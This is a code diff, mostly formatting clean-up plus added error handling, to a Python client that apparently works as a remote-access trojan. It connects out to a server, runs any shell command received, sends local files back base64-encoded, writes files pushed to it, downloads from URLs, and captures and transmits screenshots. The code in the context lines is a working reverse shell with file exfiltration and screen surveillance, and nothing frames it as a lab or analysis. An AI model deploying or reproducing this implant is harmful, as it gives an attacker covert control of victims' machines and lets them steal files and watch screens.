@@ -8,18 +8,21 @@ import time
 import requests
 from mss import mss
 
+
 def download(url):
     res = requests.get(url)
     if(res.status_code == 200):
         file_name = url.split("/")[-1]
-        with open(file_name,"wb") as out_file:
+        with open(file_name, "wb") as out_file:
             out_file.write(res.content)
     else:
         raise Exception()
 
+
 def screenshot():
     with mss() as screenshot:
         screenshot.shot()
+
 
 def connection_loop():
     MAX_TRIES = 100
@@ -32,7 +35,7 @@ def connection_loop():
             print("Connected to server")
             shell(sock)
             break
-        except: 
+        except:
             print("Error while trying to connect to the server")
             print("Retrying...")
             time.sleep(10)
@@ -42,6 +45,7 @@ def connection_loop():
         if(i == MAX_TRIES-1):
             print("Maximum tries reached, shutting down client now.")
 
+
 def shell(sock):
     while True:
         result = ""
@@ -50,7 +54,7 @@ def shell(sock):
         if cmd == "q":
             continue
         elif cmd == "close":
-                break
+            break
         elif cmd[:7] == "sendall":
             proc = subprocess.Popen(cmd[8:], shell=True, stdout=subprocess.PIPE,
                                     stderr=subprocess.PIPE, stdin=subprocess.PIPE)
@@ -61,29 +65,29 @@ def shell(sock):
                 result = str(e)
         elif cmd[:8] == "download":
             try:
-                with open(cmd[9:],"rb") as f:
+                with open(cmd[9:], "rb") as f:
                     encoded_file = base64.b64encode(f.read())
                     utils.reliable_send(sock, encoded_file.decode("utf-8"))
             except:
-                    utils.reliable_send(sock, "DOWNLOAD_FAIL")
+                utils.reliable_send(sock, "DOWNLOAD_FAIL")
         elif cmd[:6] == "upload":
-                file_data = utils.receive_frame(sock)
-                if file_data == "UPLOAD_FAIL":
-                        result = "Failed to upload"
-                else:
-                    with open(cmd[7:],"wb") as f:
-                        f.write(base64.b64decode(file_data))
-                        result = "File Uploaded!"   
+            file_data = utils.receive_frame(sock)
+            if file_data == "UPLOAD_FAIL":
+                result = "Failed to upload"
+            else:
+                with open(cmd[7:], "wb") as f:
+                    f.write(base64.b64decode(file_data))
+                    result = "File Uploaded!"
         elif cmd[:3] == "get":
             try:
                 download(cmd[4:])
                 result = "File downloaded from url"
-            except:  
+            except:
                 result = "File NOT downloaded from url"
         elif cmd[:10] == "screenshot":
             try:
                 screenshot()
-                with open("monitor-1.png","rb") as f:
+                with open("monitor-1.png", "rb") as f:
                     encoded_file = base64.b64encode(f.read())
                     utils.reliable_send(sock, encoded_file.decode("utf-8"))
                 os.remove("monitor-1.png")
@@ -95,12 +99,17 @@ def shell(sock):
                 result = "Program started!"
             except Exception as e:
                 print(e)
-                result =f"Error while trying to start '{cmd[6:]}'"
+                result = f"Error while trying to start '{cmd[6:]}'"
         else:
-            proc = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE,
-                                    stderr=subprocess.PIPE, stdin=subprocess.PIPE)
-            result = (proc.stdout.read() + proc.stderr.read()).decode("utf-8")
+            try:
+                proc = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE,
+                                        stderr=subprocess.PIPE, stdin=subprocess.PIPE)
+                result = (proc.stdout.read() +
+                          proc.stderr.read()).decode("utf-8")
+            except Exception as e:
+                result = f"Error while trying to execute {cmd}"
         utils.reliable_send(sock, result)
+
 
 def main():
     connection_loop()
